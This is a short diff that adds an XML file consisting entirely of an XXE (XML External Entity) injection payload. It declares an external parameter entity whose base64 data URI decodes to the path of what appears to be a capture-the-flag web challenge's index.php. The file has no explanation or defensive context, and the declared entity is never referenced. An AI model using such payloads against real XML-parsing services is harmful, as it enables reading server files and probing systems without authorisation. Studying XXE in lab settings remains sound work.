@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % b SYSTEM "data://text/plain;base64,L2NoYWxsZW5nZS93ZWItc2VydmV1ci9jaDI5L2luZGV4LnBocA=="> ]>
+<xxe>1</xxe>
